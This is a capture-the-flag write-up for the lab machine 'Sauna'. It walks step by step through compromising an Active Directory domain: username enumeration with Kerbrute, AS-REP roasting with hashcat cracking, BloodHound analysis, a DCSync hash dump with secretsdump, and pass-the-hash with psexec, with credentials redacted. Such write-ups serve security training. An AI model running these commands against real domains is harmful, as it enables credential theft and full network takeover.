# Sauna (Easy)

Username generation from a company website, AS-REP roasting, and a BloodHound-identified DCSync path.

## Enumeration

```bash
sudo nmap -sC -sV -p- <target>
```

```
53/tcp    open domain
80/tcp    open http          "Egotistical Bank :: Home"
88/tcp    open kerberos-sec  (Domain: EGOTISTICAL-BANK.LOCAL)
135/tcp   open msrpc
139/tcp   open netbios-ssn
389/tcp   open ldap
445/tcp   open microsoft-ds
464/tcp   open kpasswd5
593/tcp   open ncacn_http
636/tcp   open tcpwrapped
3268/tcp  open ldap
3269/tcp  open tcpwrapped
5985/tcp  open http
9389/tcp  open mc-nmf
```

LDAP anonymous bind was not permitted, but the company website listed employee names. These were converted to likely Windows usernames and validated with Kerbrute:

```bash
username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > unames.txt
kerbrute userenum --dc <target> -d EGOTISTICAL-BANK.LOCAL unames.txt
```
→ found a valid user, `fsmith`.

## Foothold — AS-REP roasting

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith@EGOTISTICAL-BANK.LOCAL
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked password redacted. Authenticated and retrieved `user.txt`:

```bash
evil-winrm -i <target> -u fsmith -p '<REDACTED>'
```

## Privilege Escalation — WinPEAS → SharpHound → DCSync

WinPEAS surfaced another set of plaintext credentials (also redacted) for a service account. SharpHound was run from the shell to collect AD data:

```powershell
.\SharpHound.exe
download <timestamp>_BloodHound.zip
```

Imported into BloodHound, **Analysis → Find Principals with DCSync Rights** showed the service account can DCSync the domain.

```bash
secretsdump.py egotistical-bank.local/<svc_account>@<target>
```

Password hashes for all domain accounts dumped; Administrator's hash used with `psexec.py`:

```bash
psexec.py egotistical-bank.local/administrator@<target> -hashes <REDACTED>:<REDACTED>
```
→ `root.txt` retrieved (located in a non-default profile folder).

## Takeaways

- Public-facing "About us" / staff pages are a goldmine for username generation.
- DCSync rights granted to low-privilege service accounts collapse the entire domain's security boundary — always audit with BloodHound.
